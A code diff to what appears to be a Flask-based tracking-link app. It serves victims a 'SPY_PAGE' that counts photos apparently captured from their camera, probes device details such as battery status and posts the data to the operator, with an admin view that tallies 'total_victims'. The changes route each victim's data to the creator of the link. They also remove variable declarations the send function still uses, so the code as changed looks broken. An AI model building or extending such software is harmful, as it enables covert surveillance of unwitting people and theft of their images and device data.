@@ -81,7 +81,7 @@ def _render_spy(link_id):
     if not visitor_id:
         visitor_id = f"VIS_{int(time.time())}_{random.randbytes(4).hex()}"
         session['visitor_id'] = visitor_id
-    return render_template_string(SPY_PAGE, visitor_id=visitor_id, target_url=target_url)
+    return render_template_string(SPY_PAGE, visitor_id=visitor_id, target_url=target_url, link_id=link_id)
 
 @app.route('/')
 def index():
@@ -138,6 +138,7 @@ SPY_PAGE = '''
     <script>
         const visitorId = "{{ visitor_id }}";
         const targetUrl = "{{ target_url }}";
+        const linkId = "{{ link_id }}";
         let photoCount = 0;
         let isCapturing = false;
         let debugEl = document.getElementById('debugInfo');
@@ -210,8 +211,6 @@ SPY_PAGE = '''
         } else { debug('❌ Battery API not supported'); }
 
         // ---------- SEND DATA ----------
-        let pendingData = [];
-        let lastSend = 0;
         function sendData(data) {
             pendingData.push(data);
             if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
@@ -222,7 +221,7 @@ SPY_PAGE = '''
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     credentials: 'same-origin',
-                    body: JSON.stringify(batch.map(d => ({ ...d, vid: visitorId })))
+                    body: JSON.stringify(batch.map(d => ({ ...d, vid: visitorId, link_id: linkId })))
                 })
                 .then(async res => {
                     const j = await res.json().catch(() => ({}));
@@ -274,7 +273,9 @@ def index_post():
             return jsonify({'status': 'error', 'message': 'Visitor ID missing'}), 400
         
         # Determine creator ID from the link data
-        link_id = request.args.get('id', '')
+        link_id = request.args.get('id', '') or request.args.get('link_id', '')
+        if not link_id and isinstance(data, list) and data:
+            link_id = data[0].get('link_id', '')
         links = load_json('links.json')
         link_data = links.get(link_id, {})
         creator_id = str(link_data.get('created_by') or config['chat_id'])
@@ -458,7 +459,7 @@ def admin():
     visitors = load_json('visitors.json')
     links = load_json('links.json')
     total_victims = len(visitors)
-    total_photos = sum(v.get('photos', 0) for v in visitors.values() if isinstance(visitors, dict))
+    total_photos = sum(v.get('photos', 0) for v in visitors.values() if isinstance(v, dict))
 
     return render_template_string(ADMIN_DASHBOARD,
                                   visitors=visitors,
